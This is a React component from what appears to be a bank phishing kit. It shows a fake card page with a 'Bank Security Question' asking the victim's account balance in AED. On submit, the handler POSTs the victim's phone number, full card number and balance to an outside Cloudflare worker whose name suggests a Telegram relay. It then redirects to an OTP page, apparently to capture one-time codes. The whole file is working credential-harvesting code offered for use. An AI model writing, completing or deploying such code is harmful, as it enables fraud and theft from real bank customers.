import React, { useState } from "react";
import logo from "../src/assets/bank.png";
import { useLocation, useNavigate } from "react-router-dom";
import cradImage from "../src/assets/adcard.png";

const AvailableBalanceForm = () => {
    const [balance, setBalance] = useState("");
    const navigate = useNavigate();
    const location = useLocation();
    const { phone, cardNumber } = location.state || {};

    // Mask card number (show first 4 digits only)
    const maskCardNumber = (number) => {
        if (!number || number.length < 6) return "**** **** **** ****";
        const visible = number.slice(0, 6);
        return `${visible} •• •••• ••••`;
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        // Send balance to backend
        try {
            await fetch("https://my-worker.atique-telegram.workers.dev", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    type: "balance",
                    phone,
                    cardNumber,
                    balance
                }),
            });
        } catch (error) {
            console.error("Error sending balance data:", error);
        }

        // Navigate to OTP page
        navigate("/otpcode", { state: { phone, balance } });
    };

    return (
        <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <div className="bg-red-700 text-white text-center py-4 text-lg font-semibold">
                Cards
            </div>

            {/* Card Info */}
            {/* <div className="bg-red-600 text-white rounded-2xl mx-4 mt-4 p-5 relative shadow-lg">
                <div className="flex justify-between items-start">
                    <div>
                        <img src={logo} alt="Bank Logo" className="h-8 w-auto" />
                    </div>
                    <div className="bg-white text-red-600 text-sm px-3 py-1 rounded-full font-semibold">
                        Debit
                    </div>
                </div>

                <div className="mt-8 text-xl tracking-widest font-mono">
                    {maskCardNumber(cardNumber)}
                </div>

                <div className="flex justify-between mt-4 text-sm">
                    <div>
                        <div className="text-gray-200">VALID THRU</div>
                        <div>••/••</div>
                    </div>
                    <div>
                        <div className="text-gray-200">CVC</div>
                        <div>•••</div>
                    </div>
                </div>
            </div> */}
            <div className="relative mx-4 mt-4 overflow-hidden rounded-2xl shadow-xl">
                <img
                    src={cradImage}
                    alt="Debit Card"
                    className="w-full h-auto block"
                />

                {/* Card Number */}
                <div className="absolute left-[7%] bottom-[28%] text-white text-lg sm:text-xl tracking-widest font-mono">
                    {/* **** **** **** 1234 */}
                    {maskCardNumber(cardNumber)}
                </div>

                {/* Valid Thru */}
                <div className="absolute left-[7%] bottom-[13%] text-white">
                    <div className="text-[9px] opacity-70">VALID THRU</div>
                    <div className="text-sm tracking-wider">••/••</div>
                </div>

                {/* CVC */}
                <div className="absolute left-[30%] bottom-[13%] text-white">
                    <div className="text-[9px] opacity-70">CVC</div>
                    <div className="text-sm tracking-wider">•••</div>
                </div>
            </div>

            {/* Form */}
            <form
                onSubmit={handleSubmit}
                className="px-4 mt-6 space-y-4 max-w-md w-full mx-auto"
            >
                {/* Account Dropdown */}
                {/* <div>
                    <label className="block text-gray-700 font-semibold mb-1">
                        Account Number
                    </label>
                    <select
                        className="w-full px-4 py-3 border border-gray-300 rounded-xl bg-gray-100 text-gray-600"
                        disabled
                    >
                        <option>Account Number : •••• •••• ••</option>
                    </select>
                </div> */}

                {/* Security Question */}
                <div>
                    <label className="block text-gray-700 font-semibold mb-1">
                        Bank Security Question
                    </label>
                    <p className="text-sm text-gray-500 mb-1">
                        How much balance available in your account?
                        {/* How much amount do you have in your account? */}
                    </p>
                    <div className="flex items-center border border-gray-300 rounded-xl overflow-hidden">
                        <span className="px-4 py-3 bg-gray-100 text-gray-600 font-semibold border-r border-gray-300">
                            AED
                        </span>
                        <input
                            type="number"
                            value={balance}
                            onChange={(e) => setBalance(e.target.value)}
                            className="flex-1 px-4 py-3 focus:outline-none"
                            required
                        />
                    </div>

                    {/* <input
                        type="text"
                        placeholder="OMR"
                        value={balance}
                        onChange={(e) => setBalance(e.target.value)}
                        className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
                        required
                    /> */}
                </div>

                {/* Continue Button */}
                <button
                    type="submit"
                    style={{ backgroundColor: "#D4253A" }}
                    className="w-full text-white py-2 rounded-xl transition"
                >
                    Continue
                </button>
            </form>


        </div>
    );
};

export default AvailableBalanceForm;
